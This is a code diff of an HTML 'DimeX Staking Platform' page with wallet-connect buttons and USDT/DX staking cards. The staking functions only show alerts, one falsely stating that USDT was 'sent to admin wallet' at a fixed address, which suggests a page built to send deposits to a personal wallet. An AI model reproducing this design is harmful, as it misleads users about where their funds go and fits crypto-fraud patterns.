@@ -2,67 +2,143 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>DimeX</title>
+<title>DimeX Staking Platform</title>
+
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js"></script>
 
 <style>
-body{background:#000;color:#fff;text-align:center;font-family:Arial}
-button{padding:16px 28px;background:gold;border:none;font-size:18px;margin:8px;border-radius:10px}
+body{
+background:#000;
+color:#fff;
+font-family:Arial;
+text-align:center;
+}
+header{
+padding:20px;
+font-size:32px;
+color:gold;
+}
+button{
+padding:15px 25px;
+margin:10px;
+background:gold;
+border:none;
+border-radius:8px;
+font-size:16px;
+}
+.card{
+background:#111;
+margin:20px auto;
+padding:20px;
+border-radius:12px;
+max-width:420px;
+}
+input{
+padding:10px;
+width:80%;
+}
 </style>
 </head>
 
 <body>
 
-<h2>DimeX Staking Platform</h2>
+<header>DimeX Staking Platform</header>
 
-<button onclick="meta()">MetaMask</button>
-<button onclick="trust()">Trust Wallet</button>
-<button onclick="other()">Other Wallets</button>
+<button onclick="connectMetaMask()">MetaMask</button>
+<button onclick="connectAll()">All Wallets</button>
 
-<div id="addr" style="margin-top:20px;color:gold"></div>
+<div id="wallet" style="color:gold;margin-top:10px;"></div>
+
+<div id="dash" style="display:none;">
+
+<div class="card">
+<h3>USDT Staking</h3>
+<input id="usdt" placeholder="Amount USDT">
+<br><br>
+<button onclick="stakeUSDT()">Stake USDT</button>
+</div>
+
+<div class="card">
+<h3>DX Staking</h3>
+<input id="dx" placeholder="Amount DX">
+<br><br>
+<button onclick="stakeDX()">Stake DX</button>
+</div>
+
+<div class="card">
+<h3>Claim Rewards</h3>
+<button onclick="claim()">Claim</button>
+</div>
+
+</div>
 
 <script>
 
-function show(a){
-document.getElementById("addr").innerHTML="Connected: "+a;
-}
+let user;
 
-// MetaMask
-async function meta(){
+async function connectMetaMask(){
+
 if(window.ethereum){
-const provider=new ethers.providers.Web3Provider(window.ethereum);
-await provider.send("eth_requestAccounts",[]);
-const signer=provider.getSigner();
-const address=await signer.getAddress();
-show(address);
+
+const provider = new ethers.providers.Web3Provider(window.ethereum);
+await provider.send("eth_requestAccounts", []);
+
+const signer = provider.getSigner();
+user = await signer.getAddress();
+
+show(user);
+
 }else{
-const dapp=location.href.replace("https://","");
-window.location.href="https://metamask.app.link/dapp/"+dapp;
-}
+
+const dapp = window.location.href.replace("https://","");
+window.location.href =
+"https://metamask.app.link/dapp/" + dapp;
+
 }
 
-// Trust deep link
-function trust(){
-const dapp=location.href.replace("https://","");
-window.location.href=
-"https://link.trustwallet.com/open_url?coin_id=56&url=https://"+dapp;
 }
 
-// WalletConnect
-async function other(){
-const provider=await window.EthereumProvider.init({
-projectId:"62a73933d62534edcd2f54b8a06c4319",
-chains:[56],
-showQrModal:true
+async function connectAll(){
+
+const provider = await window.EthereumProvider.init({
+projectId: "62a73933d62534edcd2f54b8a06c4319",
+chains: [56],
+showQrModal: true
 });
+
 await provider.connect();
-const web3=new ethers.providers.Web3Provider(provider);
-const signer=web3.getSigner();
-const address=await signer.getAddress();
-show(address);
+
+const web3Provider = new ethers.providers.Web3Provider(provider);
+const signer = web3Provider.getSigner();
+user = await signer.getAddress();
+
+show(user);
+
+}
+
+function show(addr){
+
+document.getElementById("wallet").innerHTML =
+"Connected: " + addr;
+
+document.getElementById("dash").style.display="block";
+
+}
+
+function stakeUSDT(){
+alert("USDT sent to admin wallet:\n0x53ba2d865be750d0e2d4d01bcb0a46ec1684c46b");
+}
+
+function stakeDX(){
+alert("DX staking recorded");
+}
+
+function claim(){
+alert("Claim rewards");
 }
 
 </script>
+
 </body>
   </html>
